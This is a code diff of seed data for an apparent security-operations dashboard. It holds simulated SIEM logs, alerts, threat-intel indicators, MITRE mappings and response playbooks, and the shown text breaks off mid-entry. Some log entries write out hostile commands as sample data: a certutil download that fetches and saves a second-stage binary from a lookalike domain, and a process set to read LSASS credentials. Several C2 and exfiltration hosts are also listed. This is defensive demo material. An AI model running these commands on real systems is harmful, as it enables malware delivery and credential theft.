@@ -1,18 +1,62 @@
+import { sql } from 'drizzle-orm';
+import { db } from './index.ts';
 import {
-  SecurityLog,
-  SecurityAlert,
-  ThreatIntelligenceItem,
-  EndpointHost,
-  MitreTechnique,
-  SoarPlaybook,
-  UebaProfile,
-  AttackScenario,
-} from '../types/soc.ts';
+  securityLogs,
+  securityAlerts,
+  siemConnectors,
+  endpoints,
+  threatIntel,
+  mitreTechniques,
+  soarPlaybooks,
+  uebaProfiles,
+  attackScenarios,
+  incidentActions,
+  playbookExecutions,
+} from './schema.ts';
 
-export const INITIAL_LOGS: SecurityLog[] = [
+const BASELINE_CONNECTORS = [
+  {
+    id: 'conn-splunk-hec',
+    name: 'Splunk Enterprise HEC',
+    type: 'splunk_hec',
+    endpointUrl: '/api/siem/splunk-hec',
+    status: 'connected',
+    eventCount: 1420,
+    config: { index: 'aegis_security', sourcetype: 'WinEventLog:Security' },
+  },
+  {
+    id: 'conn-elastic-bulk',
+    name: 'Elasticsearch SIEM Bulk',
+    type: 'elastic_search',
+    endpointUrl: '/api/siem/ingest',
+    status: 'connected',
+    eventCount: 980,
+    config: { indexPattern: 'logs-security-*' },
+  },
+  {
+    id: 'conn-sophos-xdr',
+    name: 'Sophos Central XDR API',
+    type: 'sophos_central',
+    endpointUrl: 'https://api.central.sophos.com/endpoint/v1',
+    status: 'connected',
+    eventCount: 412,
+    config: { tenantRegion: 'ap-southeast-1', liveResponse: true },
+  },
+  {
+    id: 'conn-shuffle-soar',
+    name: 'Shuffle SOAR Workflow Engine',
+    type: 'shuffle_soar',
+    endpointUrl: 'https://shuffler.io/api/v1/workflows',
+    status: 'connected',
+    eventCount: 87,
+    config: { runnerPool: 'prod-k8s-soar-01' },
+  },
+];
+
+const BASELINE_LOGS = [
   {
     id: 'log-101',
-    timestamp: '2026-10-06 23:42:15.102',
+    timestamp: new Date(Date.now() - 1000 * 60 * 14),
     sourceType: 'WinEventLog:Security',
     host: 'WS-FINANCE-07',
     user: 'CORP\\m.jenkins',
@@ -21,19 +65,21 @@ export const INITIAL_LOGS: SecurityLog[] = [
     destPort: 443,
     eventId: 4688,
     processName: 'certutil.exe',
-    commandLine: 'certutil.exe -urlcache -split -f https://raw.githubusercontent-cdn.top/stage2.bin C:\\Users\\Public\\update.exe',
     parentProcess: 'EXCEL.EXE',
+    commandLine:
+      'certutil.exe -urlcache -split -f https://raw.githubusercontent-cdn.top/stage2.bin C:\\Users\\Public\\update.exe',
     fileHash: '8f4c2e6b91a7d3f048e5b6c2d1e0f9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2',
     message: 'Process Creation: Obfuscated certutil download initiated by parent process EXCEL.EXE',
     severity: 'critical',
-    raw: '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing"/><EventID>4688</EventID><TimeCreated SystemTime="2026-10-06T23:42:15.102Z"/><Computer>WS-FINANCE-07</Computer></System><EventData><Data Name="NewProcessName">C:\\Windows\\System32\\certutil.exe</Data><Data Name="CommandLine">certutil.exe -urlcache -split -f https://raw.githubusercontent-cdn.top/stage2.bin C:\\Users\\Public\\update.exe</Data><Data Name="ParentProcessName">C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE</Data></EventData></Event>',
+    raw: '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing"/><EventID>4688</EventID><Computer>WS-FINANCE-07</Computer></System><EventData><Data Name="NewProcessName">C:\\Windows\\System32\\certutil.exe</Data><Data Name="CommandLine">certutil.exe -urlcache -split -f https://raw.githubusercontent-cdn.top/stage2.bin C:\\Users\\Public\\update.exe</Data><Data Name="ParentProcessName">EXCEL.EXE</Data></EventData></Event>',
     entropy: 4.89,
     clusterId: 'CLUSTER_LOLBIN_EXEC',
     anomalyScore: 96,
+    tags: ['lolbin', 'certutil', 'execution'],
   },
   {
     id: 'log-102',
-    timestamp: '2026-10-06 23:42:48.330',
+    timestamp: new Date(Date.now() - 1000 * 60 * 13),
     sourceType: 'Sophos:XDR',
     host: 'WS-FINANCE-07',
     user: 'CORP\\m.jenkins',
@@ -41,16 +87,18 @@ export const INITIAL_LOGS: SecurityLog[] = [
     parentProcess: 'certutil.exe',
     commandLine: 'C:\\Users\\Public\\update.exe --inject-lsass',
     fileHash: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
-    message: 'Sophos Intercept X: Credential Guard violation detected. Attempted OpenProcess against LSASS with PROCESS_VM_READ',
+    message:
+      'Sophos Intercept X: Credential Guard violation detected. Attempted OpenProcess against LSASS with PROCESS_VM_READ',
     severity: 'critical',
-    raw: '{"source":"Sophos XDR","threat":"Mal/EncCredential-A","action":"blocked_attempt","process":"C:\\Users\\Public\\update.exe","target_pid":724,"target":"lsass.exe","tactic":"Credential Access","technique":"T1003.001"}',
+    raw: '{"source":"Sophos XDR","threat":"Mal/EncCredential-A","action":"blocked_attempt","process":"C:\\\\Users\\\\Public\\\\update.exe","target_pid":724,"target":"lsass.exe","tactic":"Credential Access","technique":"T1003.001"}',
     entropy: 5.12,
     clusterId: 'CLUSTER_MEM_INJECT',
     anomalyScore: 99,
+    tags: ['lsass', 'credential-access', 'sophos-xdr'],
   },
   {
     id: 'log-103',
-    timestamp: '2026-10-06 23:43:10.015',
+    timestamp: new Date(Date.now() - 1000 * 60 * 12),
     sourceType: 'Network:Zeek',
     host: 'GATEWAY-CORP-FW',
     user: 'CORP\\m.jenkins',
@@ -63,10 +111,11 @@ export const INITIAL_LOGS: SecurityLog[] = [
     entropy: 6.74,
     clusterId: 'CLUSTER_C2_BEACON',
     anomalyScore: 91,
+    tags: ['zeek', 'c2', 'cobalt-strike'],
   },
   {
     id: 'log-104',
-    timestamp: '2026-10-06 23:44:02.880',
+    timestamp: new Date(Date.now() - 1000 * 60 * 11),
     sourceType: 'WinEventLog:Security',
     host: 'DC-CORP-01',
     user: 'CORP\\svc_backup',
@@ -75,14 +124,15 @@ export const INITIAL_LOGS: SecurityLog[] = [
     eventId: 4625,
     message: 'Audit Failure: 14 failed Kerberos authentication attempts for svc_backup with invalid ticket pre-authentication',
     severity: 'high',
-    raw: '<Event><System><EventID>4625</EventID><Computer>DC-CORP-01</Computer></System><EventData><Data Name="TargetUserName">svc_backup</Data><Data Name="Status">0xC000006A</Data><Data Name="FailureReason">Unknown user name or bad password</Data><Data Name="WorkstationName">WS-FINANCE-07</Data></EventData></Event>',
-    entropy: 3.10,
+    raw: '<Event><System><EventID>4625</EventID><Computer>DC-CORP-01</Computer></System><EventData><Data Name="TargetUserName">svc_backup</Data><Data Name="Status">0xC000006A</Data><Data Name="WorkstationName">WS-FINANCE-07</Data></EventData></Event>',
+    entropy: 3.1,
     clusterId: 'CLUSTER_AUTH_BRUTE',
     anomalyScore: 84,
+    tags: ['kerberos', 'brute-force'],
   },
   {
     id: 'log-105',
-    timestamp: '2026-10-06 23:45:18.910',
+    timestamp: new Date(Date.now() - 1000 * 60 * 10),
     sourceType: 'WinEventLog:Security',
     host: 'DC-CORP-01',
     user: 'CORP\\Administrator',
@@ -97,10 +147,11 @@ export const INITIAL_LOGS: SecurityLog[] = [
     entropy: 5.45,
     clusterId: 'CLUSTER_RANSOM_PREP',
     anomalyScore: 98,
+    tags: ['psexec', 'vssadmin', 'ransomware'],
   },
   {
     id: 'log-106',
-    timestamp: '2026-10-06 23:47:05.120',
+    timestamp: new Date(Date.now() - 1000 * 60 * 8),
     sourceType: 'AWS:CloudTrail',
     host: 'AWS-AP-SOUTHEAST-1',
     user: 'dev_automation_role',
@@ -108,13 +159,14 @@ export const INITIAL_LOGS: SecurityLog[] = [
     message: 'AWS CloudTrail: PutBucketPolicy with wildcard Principal on s3://corp-finance-vault-2026 from unauthorized ASN',
     severity: 'high',
     raw: '{"eventTime":"2026-10-06T23:47:05Z","eventName":"PutBucketPolicy","userIdentity":{"type":"AssumedRole","arn":"arn:aws:sts::965687878082:assumed-role/dev_automation_role/token-session"},"sourceIPAddress":"194.26.29.112","requestParameters":{"bucketName":"corp-finance-vault-2026"}}',
-    entropy: 4.10,
+    entropy: 4.1,
     clusterId: 'CLUSTER_IAM_EXPLOIT',
     anomalyScore: 88,
+    tags: ['aws', 'cloudtrail', 's3'],
   },
   {
     id: 'log-107',
-    timestamp: '2026-10-06 23:48:30.400',
+    timestamp: new Date(Date.now() - 1000 * 60 * 6),
     sourceType: 'Linux:Syslog',
     host: 'BASTION-PROD-01',
     user: 'root',
@@ -123,29 +175,32 @@ export const INITIAL_LOGS: SecurityLog[] = [
     message: 'sshd: Accepted publickey for root from 10.0.4.12 port 52210 ssh2: RSA SHA256:7uKlQ8+0/a',
     severity: 'info',
     raw: 'Oct 06 23:48:30 BASTION-PROD-01 sshd[28410]: Accepted publickey for root from 10.0.4.12 port 52210 ssh2',
-    entropy: 2.10,
+    entropy: 2.1,
     clusterId: 'CLUSTER_NORMAL_OPS',
     anomalyScore: 8,
+    tags: ['ssh', 'syslog'],
   },
   {
     id: 'log-108',
-    timestamp: '2026-10-06 23:49:12.782',
+    timestamp: new Date(Date.now() - 1000 * 60 * 4),
     sourceType: 'Firewall:PaloAlto',
     host: 'PA-5250-PERIMETER',
     user: 'CORP\\m.jenkins',
     srcIp: '192.168.10.45',
     destIp: '91.215.85.17',
     destPort: 53,
-    message: 'Palo Alto Threat Engine: High entropy DNS queries detected (180 subdomains/min) indicative of DNS tunneling',
+    message:
+      'Palo Alto Threat Engine: High entropy DNS queries detected (180 subdomains/min) targeting a8f9c1b3.tunnel.c2-darknode.net',
     severity: 'high',
-    raw: 'THREAT,dns,2026/10/06 23:49:12,192.168.10.45,91.215.85.17,0,0,rule-block-c2,dns-tunneling,vsys1,alert,0,0',
+    raw: 'THREAT,dns,2026/10/06 23:49:12,192.168.10.45,91.215.85.17,0,0,rule-block-c2,dns-tunneling,a8f9c1b3.tunnel.c2-darknode.net',
     entropy: 7.22,
     clusterId: 'CLUSTER_DNS_TUNNEL',
     anomalyScore: 93,
+    tags: ['dns-tunnel', 'palo-alto'],
   },
   {
     id: 'log-109',
-    timestamp: '2026-10-06 23:50:00.050',
+    timestamp: new Date(Date.now() - 1000 * 60 * 3),
     sourceType: 'WinEventLog:Security',
     host: 'WS-DEV-02',
     user: 'CORP\\a.patel',
@@ -154,13 +209,14 @@ export const INITIAL_LOGS: SecurityLog[] = [
     message: 'Audit Success: Successful interactive logon for CORP\\a.patel on WS-DEV-02',
     severity: 'low',
     raw: '<Event><System><EventID>4624</EventID><Computer>WS-DEV-02</Computer></System><EventData><Data Name="TargetUserName">a.patel</Data><Data Name="LogonType">2</Data></EventData></Event>',
-    entropy: 1.80,
+    entropy: 1.8,
     clusterId: 'CLUSTER_NORMAL_OPS',
     anomalyScore: 4,
+    tags: ['logon'],
   },
   {
     id: 'log-110',
-    timestamp: '2026-10-06 23:51:20.912',
+    timestamp: new Date(Date.now() - 1000 * 60 * 1),
     sourceType: 'WinEventLog:Security',
     host: 'WS-FINANCE-07',
     user: 'CORP\\SYSTEM',
@@ -168,22 +224,23 @@ export const INITIAL_LOGS: SecurityLog[] = [
     message: 'The audit log was cleared by Administrator on host WS-FINANCE-07',
     severity: 'critical',
     raw: '<Event><System><EventID>1102</EventID><Computer>WS-FINANCE-07</Computer></System><EventData><Data Name="SubjectUserName">SYSTEM</Data></EventData></Event>',
-    entropy: 3.90,
+    entropy: 3.9,
     clusterId: 'CLUSTER_DEFENSE_EVASION',
     anomalyScore: 97,
+    tags: ['defense-evasion', 'event-log-clear'],
   },
 ];
 
-export const INITIAL_ALERTS: SecurityAlert[] = [
+const BASELINE_ALERTS = [
   {
     id: 'ALT-2026-001',
     title: 'Multi-Stage Ransomware Kill Chain Initiated',
-    description: 'LogAI cluster correlation detected LOLBin execution (certutil.exe) followed by Sophos XDR LSASS injection and Volume Shadow Copy deletion via PsExec.',
+    description:
+      'LogAI cluster correlation detected LOLBin execution (certutil.exe) followed by Sophos XDR LSASS injection and Volume Shadow Copy deletion via PsExec.',
     severity: 'critical',
     status: 'new',
-    detectedAt: '2026-10-06 23:45:20',
     source: 'LogAI',
-    endpoint: 'WS-FINANCE-07',
+    host: 'WS-FINANCE-07',
     user: 'CORP\\m.jenkins',
     mitreTactic: 'Impact / Credential Access',
     mitreTechniqueId: 'T1486',
@@ -192,15 +249,21 @@ export const INITIAL_ALERTS: SecurityAlert[] = [
     confidenceScore: 98,
     relatedLogIds: ['log-101', 'log-102', 'log-103', 'log-105'],
     iocs: [
-      { type: 'ip', value: '185.220.101.5', threatScore: 97 },
-      { type: 'sha256', value: '8f4c2e6b91a7d3f048e5b6c2d1e0f9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2', threatScore: 99 },
-      { type: 'domain', value: 'cdn-relay-telemetry.org', threatScore: 92 },
-      { type: 'user', value: 'CORP\\m.jenkins', threatScore: 78 },
+      { type: 'ip' as const, value: '185.220.101.5', threatScore: 97 },
+      {
+        type: 'sha256' as const,
+        value: '8f4c2e6b91a7d3f048e5b6c2d1e0f9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2',
+        threatScore: 99,
+      },
+      { type: 'domain' as const, value: 'cdn-relay-telemetry.org', threatScore: 92 },
+      { type: 'user' as const, value: 'CORP\\m.jenkins', threatScore: 78 },
     ],
     playbookId: 'PB-RANSOMWARE-01',
     aiAnalysis: {
-      summary: 'Critical BlackCat/ALPHV ransomware staging detected. The adversary used weaponized Excel documents to drop secondary payloads, harvested LSASS credentials, and staged PsExec lateral movement to DC-CORP-01.',
-      rootCause: 'Phishing email with macro attachment delivered to finance accountant, executing certutil LOLBin to bypass traditional antivirus.',
+      summary:
+        'Critical BlackCat/ALPHV ransomware staging detected. The adversary used weaponized Excel documents to drop secondary payloads, harvested LSASS credentials, and staged PsExec lateral movement to DC-CORP-01.',
+      rootCause:
+        'Phishing email with macro attachment delivered to finance accountant, executing certutil LOLBin to bypass traditional antivirus.',
       recommendations: [
         'Isolate WS-FINANCE-07 immediately via Sophos XDR host containment',
         'Revoke Active Directory Kerberos Golden/Silver ticket caching on DC-CORP-01',
@@ -213,12 +276,12 @@ export const INITIAL_ALERTS: SecurityAlert[] = [
   {
     id: 'ALT-2026-002',
     title: 'Alkido Behavioral Anomaly: High-Entropy DNS Exfiltration Tunnel',
-    description: 'Alkido sequence parser identified anomalous DNS query burst with character entropy 7.22 bit/char targeting external nameserver 91.215.85.17.',
+    description:
+      'Alkido sequence parser identified anomalous DNS query burst with character entropy 7.22 bit/char targeting external nameserver 91.215.85.17.',
     severity: 'high',
     status: 'investigating',
-    detectedAt: '2026-10-06 23:49:15',
     source: 'Alkido',
-    endpoint: 'WS-FINANCE-07',
+    host: 'WS-FINANCE-07',
     user: 'CORP\\m.jenkins',
     mitreTactic: 'Command and Control / Exfiltration',
     mitreTechniqueId: 'T1071.004',
@@ -227,20 +290,20 @@ export const INITIAL_ALERTS: SecurityAlert[] = [
     confidenceScore: 92,
     relatedLogIds: ['log-108'],
     iocs: [
-      { type: 'ip', value: '91.215.85.17', threatScore: 94 },
-      { type: 'domain', value: 'ns1.corp-exfil-sink.net', threatScore: 91 },
+      { type: 'ip' as const, value: '91.215.85.17', threatScore: 94 },
+      { type: 'domain' as const, value: 'a8f9c1b3.tunnel.c2-darknode.net', threatScore: 91 },
     ],
     playbookId: 'PB-DNS-TUNNEL-02',
   },
   {
     id: 'ALT-2026-003',
     title: 'CloudTrail IAM Policy Backdoor Injection',
-    description: 'Splunk Correlation Engine flagged PutBucketPolicy wildcard injection on corp-finance-vault-2026 origin from Russian ASN.',
+    description:
+      'Splunk Correlation Engine flagged PutBucketPolicy wildcard injection on corp-finance-vault-2026 origin from Russian ASN.',
     severity: 'high',
     status: 'new',
-    detectedAt: '2026-10-06 23:47:10',
     source: 'Splunk Correlation',
-    endpoint: 'AWS-AP-SOUTHEAST-1',
+    host: 'AWS-AP-SOUTHEAST-1',
     user: 'dev_automation_role',
     mitreTactic: 'Persistence',
     mitreTechniqueId: 'T1098.001',
@@ -249,8 +312,8 @@ export const INITIAL_ALERTS: SecurityAlert[] = [
     confidenceScore: 89,
     relatedLogIds: ['log-106'],
     iocs: [
-      { type: 'ip', value: '194.26.29.112', threatScore: 88 },
-      { type: 'user', value: 'dev_automation_role', threatScore: 85 },
+      { type: 'ip' as const, value: '194.26.29.112', threatScore: 88 },
+      { type: 'user' as const, value: 'dev_automation_role', threatScore: 85 },
     ],
     playbookId: 'PB-CLOUD-IAM-03',
   },
@@ -260,9 +323,8 @@ export const INITIAL_ALERTS: SecurityAlert[] = [
     description: 'Security Event Log cleared on WS-FINANCE-07 by SYSTEM account after suspicious process executions.',
     severity: 'critical',
     status: 'new',
-    detectedAt: '2026-10-06 23:51:22',
     source: 'Elastic SIEM',
-    endpoint: 'WS-FINANCE-07',
+    host: 'WS-FINANCE-07',
     user: 'CORP\\SYSTEM',
     mitreTactic: 'Defense Evasion',
     mitreTechniqueId: 'T1070.001',
@@ -270,99 +332,11 @@ export const INITIAL_ALERTS: SecurityAlert[] = [
     d3fendCountermeasure: 'D3-FLA (Forwarded Log Analysis)',
     confidenceScore: 95,
     relatedLogIds: ['log-110'],
-    iocs: [
-      { type: 'user', value: 'CORP\\SYSTEM', threatScore: 80 },
-    ],
+    iocs: [{ type: 'user' as const, value: 'CORP\\SYSTEM', threatScore: 80 }],
   },
 ];
 
-export const INITIAL_THREAT_INTEL: ThreatIntelligenceItem[] = [
-  {
-    id: 'IOC-001',
-    indicator: '185.220.101.5',
-    type: 'ip',
-    threatName: 'Cobalt Strike Team Server / ALPHV Stager',
-    feedSource: 'AlienVault OTX',
-    reputationScore: 98,
-    confidence: 96,
-    associatedThreatActor: 'FIN7 / ALPHV',
-    geolocation: 'Netherlands (Tor Exit Node / Bulletproof)',
-    tags: ['CobaltStrike', 'C2', 'Ransomware', 'Malleable-C2'],
-    firstSeen: '2026-08-14',
-    lastSeen: '2026-10-06',
-    activeCampaign: 'Operation DarkCashier',
-  },
-  {
-    id: 'IOC-002',
-    indicator: '8f4c2e6b91a7d3f048e5b6c2d1e0f9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2',
-    type: 'sha256',
-    threatName: 'BlackCat Encryptor Dropper (Go-based)',
-    feedSource: 'VirusTotal',
-    reputationScore: 100,
-    confidence: 99,
-    associatedThreatActor: 'BlackCat Gang',
-    tags: ['Ransomware', 'Golang', 'Trojan.KillDisk', 'LOLBin-Target'],
-    firstSeen: '2026-09-28',
-    lastSeen: '2026-10-06',
-    activeCampaign: 'BlackCat Enterprise Extortion',
-  },
-  {
-    id: 'IOC-003',
-    indicator: 'cdn-relay-telemetry.org',
-    type: 'domain',
-    threatName: 'Cobalt Strike Fast-Flux Domain',
-    feedSource: 'MISP',
-    reputationScore: 94,
-    confidence: 90,
-    associatedThreatActor: 'Scattered Spider',
-    tags: ['FastFlux', 'DNS-Hijack', 'C2-Relay'],
-    firstSeen: '2026-10-01',
-    lastSeen: '2026-10-06',
-  },
-  {
-    id: 'IOC-004',
-    indicator: '91.215.85.17',
-    type: 'ip',
-    threatName: 'Iodine DNS Tunneling Server',
-    feedSource: 'AbuseIPDB',
-    reputationScore: 92,
-    confidence: 88,
-    associatedThreatActor: 'Unknown Exfil Operator',
-    geolocation: 'Seychelles (High Risk Hosting)',
-    tags: ['DNS-Exfiltration', 'Tunneling', 'Port53-Anomaly'],
-    firstSeen: '2026-09-15',
-    lastSeen: '2026-10-06',
-  },
-  {
-    id: 'IOC-005',
-    indicator: '194.26.29.112',
-    type: 'ip',
-    threatName: 'Cloud Brute-Force & IAM Spraying Proxy',
-    feedSource: 'AlienVault OTX',
-    reputationScore: 89,
-    confidence: 85,
-    associatedThreatActor: 'Kevlar Group',
-    geolocation: 'Saint Petersburg, Russia',
-    tags: ['CloudTrail-Abuse', 'IAM-Spraying', 'Credential-Stuffing'],
-    firstSeen: '2026-10-04',
-    lastSeen: '2026-10-06',
-  },
-  {
-    id: 'IOC-006',
-    indicator: 'CVE-2024-3400',
-    type: 'cve',
-    threatName: 'Palo Alto PAN-OS Command Injection in GlobalProtect',
-    feedSource: 'CISA KEV',
-    reputationScore: 95,
-    confidence: 100,
-    associatedThreatActor: 'UTA0218',
-    tags: ['RCE', 'Zero-Day', 'Exploit-Public-Facing'],
-    firstSeen: '2024-04-12',
-    lastSeen: '2026-10-05',
-  },
-];
-
-export const INITIAL_ENDPOINTS: EndpointHost[] = [
+const BASELINE_ENDPOINTS = [
   {
     id: 'host-01',
     hostname: 'DC-CORP-01',
@@ -435,8 +409,93 @@ export const INITIAL_ENDPOINTS: EndpointHost[] = [
   },
 ];
 
-export const INITIAL_MITRE_TECHNIQUES: MitreTechnique[] = [
-  // Reconnaissance
+const BASELINE_THREAT_INTEL = [
+  {
+    id: 'IOC-001',
+    indicator: '185.220.101.5',
+    type: 'ip',
+    threatName: 'Cobalt Strike Team Server / ALPHV Stager',
+    feedSource: 'AlienVault OTX',
+    reputationScore: 98,
+    confidence: 96,
+    associatedThreatActor: 'FIN7 / ALPHV',
+    geolocation: 'Netherlands (Tor Exit Node / Bulletproof)',
+    tags: ['CobaltStrike', 'C2', 'Ransomware', 'Malleable-C2'],
+    firstSeen: '2026-08-14',
+    lastSeen: '2026-10-06',
+    activeCampaign: 'Operation DarkCashier',
+  },
+  {
+    id: 'IOC-002',
+    indicator: '8f4c2e6b91a7d3f048e5b6c2d1e0f9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2',
+    type: 'sha256',
+    threatName: 'BlackCat Encryptor Dropper (Go-based)',
+    feedSource: 'VirusTotal',
+    reputationScore: 100,
+    confidence: 99,
+    associatedThreatActor: 'BlackCat Gang',
+    tags: ['Ransomware', 'Golang', 'Trojan.KillDisk', 'LOLBin-Target'],
+    firstSeen: '2026-09-28',
+    lastSeen: '2026-10-06',
+    activeCampaign: 'BlackCat Enterprise Extortion',
+  },
+  {
+    id: 'IOC-003',
+    indicator: 'cdn-relay-telemetry.org',
+    type: 'domain',
+    threatName: 'Cobalt Strike Fast-Flux Domain',
+    feedSource: 'MISP',
+    reputationScore: 94,
+    confidence: 90,
+    associatedThreatActor: 'Scattered Spider',
+    tags: ['FastFlux', 'DNS-Hijack', 'C2-Relay'],
+    firstSeen: '2026-10-01',
+    lastSeen: '2026-10-06',
+  },
+  {
+    id: 'IOC-004',
+    indicator: '91.215.85.17',
+    type: 'ip',
+    threatName: 'Iodine DNS Tunneling Server',
+    feedSource: 'AbuseIPDB',
+    reputationScore: 92,
+    confidence: 88,
+    associatedThreatActor: 'DarkGate Team (UNC4191)',
+    geolocation: 'Seychelles (High Risk Hosting)',
+    tags: ['DNS-Exfiltration', 'Tunneling', 'Port53-Anomaly'],
+    firstSeen: '2026-09-15',
+    lastSeen: '2026-10-06',
+  },
+  {
+    id: 'IOC-005',
+    indicator: '194.26.29.112',
+    type: 'ip',
+    threatName: 'Cloud Brute-Force & IAM Spraying Proxy',
+    feedSource: 'AlienVault OTX',
+    reputationScore: 89,
+    confidence: 85,
+    associatedThreatActor: 'Kevlar Group',
+    geolocation: 'Saint Petersburg, Russia',
+    tags: ['CloudTrail-Abuse', 'IAM-Spraying', 'Credential-Stuffing'],
+    firstSeen: '2026-10-04',
+    lastSeen: '2026-10-06',
+  },
+  {
+    id: 'IOC-006',
+    indicator: 'CVE-2024-3400',
+    type: 'cve',
+    threatName: 'Palo Alto PAN-OS Command Injection in GlobalProtect',
+    feedSource: 'CISA KEV',
+    reputationScore: 95,
+    confidence: 100,
+    associatedThreatActor: 'UTA0218',
+    tags: ['RCE', 'Zero-Day', 'Exploit-Public-Facing'],
+    firstSeen: '2024-04-12',
+    lastSeen: '2026-10-05',
+  },
+];
+
+const BASELINE_MITRE = [
   {
     id: 'T1595',
     name: 'Active Scanning',
@@ -450,7 +509,6 @@ export const INITIAL_MITRE_TECHNIQUES: MitreTechnique[] = [
     d3fendCategory: 'Detect',
     gapStatus: 'covered',
   },
-  // Initial Access
   {
     id: 'T1566.001',
     name: 'Spearphishing Attachment',
@@ -477,7 +535,6 @@ export const INITIAL_MITRE_TECHNIQUES: MitreTechnique[] = [
     d3fendCategory: 'Evict',
     gapStatus: 'uncovered_gap',
   },
-  // Execution
   {
     id: 'T1059.001',
     name: 'PowerShell',
@@ -504,7 +561,6 @@ export const INITIAL_MITRE_TECHNIQUES: MitreTechnique[] = [
     d3fendCategory: 'Detect',
     gapStatus: 'active_threat_covered',
   },
-  // Persistence
   {
     id: 'T1543.003',
     name: 'Windows Service Creation',
@@ -531,7 +587,6 @@ export const INITIAL_MITRE_TECHNIQUES: MitreTechnique[] = [
     d3fendCategory: 'Model',
     gapStatus: 'uncovered_gap',
   },
-  // Privilege Escalation
   {
     id: 'T1548.002',
     name: 'Bypass User Account Control (UAC)',
@@ -545,7 +600,6 @@ export const INITIAL_MITRE_TECHNIQUES: MitreTechnique[] = [
     d3fendCategory: 'Harden',
     gapStatus: 'covered',
   },
-  // Defense Evasion
   {
     id: 'T1070.001',
     name: 'Clear Windows Event Logs',
@@ -572,7 +626,6 @@ export const INITIAL_MITRE_TECHNIQUES: MitreTechnique[] = [
     d3fendCategory: 'Detect',
     gapStatus: 'covered',
   },
-  // Credential Access
   {
     id: 'T1003.001',
     name: 'LSASS Memory Dumping',
@@ -599,7 +652,6 @@ export const INITIAL_MITRE_TECHNIQUES: MitreTechnique[] = [
     d3fendCategory: 'Harden',
     gapStatus: 'uncovered_gap',
   },
-  // Discovery
   {
     id: 'T1087.002',
     name: 'Domain Account Discovery',
@@ -613,7 +665,6 @@ export const INITIAL_MITRE_TECHNIQUES: MitreTechnique[] = [
     d3fendCategory: 'Detect',
     gapStatus: 'covered',
   },
-  // Lateral Movement
   {
     id: 'T1021.002',
     name: 'SMB / Windows Admin Shares (PsExec)',
@@ -627,7 +678,6 @@ export const INITIAL_MITRE_TECHNIQUES: MitreTechnique[] = [
     d3fendCategory: 'Isolate',
     gapStatus: 'active_threat_covered',
   },
-  // Command and Control
   {
     id: 'T1071.004',
     name: 'DNS Tunneling',
@@ -641,13 +691,12 @@ export const INITIAL_MITRE_TECHNIQUES: MitreTechnique[] = [
     d3fendCategory: 'Isolate',
     gapStatus: 'active_threat_covered',
   },
-  // Exfiltration
   {
     id: 'T1567',
     name: 'Exfiltration Over Web Service',
     tacticId: 'TA0010',
     tacticName: 'Exfiltration',
-    description: 'Transferring sensitive corporate files to cloud storage or Megaupload/Dropbox.',
+    description: 'Transferring sensitive corporate files to cloud storage or external web endpoints.',
     detectedCount: 2,
     coveredByRules: false,
     d3fendTechniqueId: 'D3-DLP',
@@ -655,7 +704,6 @@ export const INITIAL_MITRE_TECHNIQUES: MitreTechnique[] = [
     d3fendCategory: 'Detect',
     gapStatus: 'uncovered_gap',
   },
-  // Impact
   {
     id: 'T1486',
     name: 'Data Encrypted for Ransom',
@@ -684,11 +732,12 @@ export const INITIAL_MITRE_TECHNIQUES: MitreTechnique[] = [
   },
 ];
 
-export const INITIAL_PLAYBOOKS: SoarPlaybook[] = [
+const BASELINE_PLAYBOOKS = [
   {
     id: 'PB-RANSOMWARE-01',
     name: 'Ransomware Rapid Containment & Kill-Chain Isolation',
-    description: 'Automated high-speed response orchestrated by Shuffle SOAR: isolates infected endpoints, revokes Active Directory sessions, terminates malicious processes, and pushes edge firewall blocks.',
+    description:
+      'Automated high-speed response orchestrated by Shuffle SOAR: isolates infected endpoints, revokes Active Directory sessions, terminates malicious processes, and pushes edge firewall blocks.',
     triggerEvent: 'LogAI / Sophos Critical Detection (T1486 / T1490 / T1003.001)',
     targetThreat: 'Ransomware Outbreak (BlackCat, LockBit, Royal)',
     executionCount: 14,
@@ -752,7 +801,7 @@ export const INITIAL_PLAYBOOKS: SoarPlaybook[] = [
         name: 'DNS Sinkhole Redirection',
         action: 'sinkhole_domain',
         targetSystem: 'Palo Alto FW',
-        description: 'Reroute all queries for ns1.corp-exfil-sink.net to SOC honeypot sinkhole (127.0.0.1).',
+        description: 'Reroute all queries for a8f9c1b3.tunnel.c2-darknode.net to SOC honeypot sinkhole (127.0.0.1).',
         status: 'idle',
       },
       {
@@ -776,7 +825,8 @@ export const INITIAL_PLAYBOOKS: SoarPlaybook[] = [
   {
     id: 'PB-CLOUD-IAM-03',
     name: 'AWS Cloud IAM Privilege Escalation Remediation',
-    description: 'Shuffle playbook revoking compromised STS tokens, resetting bucket policies to private, and triggering GuardDuty snapshot.',
+    description:
+      'Shuffle playbook revoking compromised STS tokens, resetting bucket policies to private, and triggering GuardDuty snapshot.',
     triggerEvent: 'AWS CloudTrail PutBucketPolicy Wildcard (T1098.001)',
     targetThreat: 'Cloud Account Takeover & S3 Exfiltration',
     executionCount: 9,
@@ -811,7 +861,7 @@ export const INITIAL_PLAYBOOKS: SoarPlaybook[] = [
   },
 ];
 
-export const INITIAL_UEBA_PROFILES: UebaProfile[] = [
+const BASELINE_UEBA = [
   {
     username: 'CORP\\m.jenkins',
     department: 'Finance & Accounts',
@@ -865,20 +915,51 @@ export const INITIAL_UEBA_PROFILES: UebaProfile[] = [
   },
 ];
 
-export const ATTACK_SCENARIOS: AttackScenario[] = [
+const BASELINE_SCENARIOS = [
   {
     id: 'SCENARIO-RANSOMWARE',
     name: 'BlackCat (ALPHV) Enterprise Ransomware Attack',
     adversary: 'ALPHV / BlackCat Crime Syndicate',
     severity: 'critical',
-    description: 'Simulates a complete 6-stage ransomware kill chain: spearphishing email with malicious macro -> certutil download -> LSASS memory dump -> PsExec lateral movement to DC -> Volume Shadow Copy wipe -> ransom deployment.',
+    description:
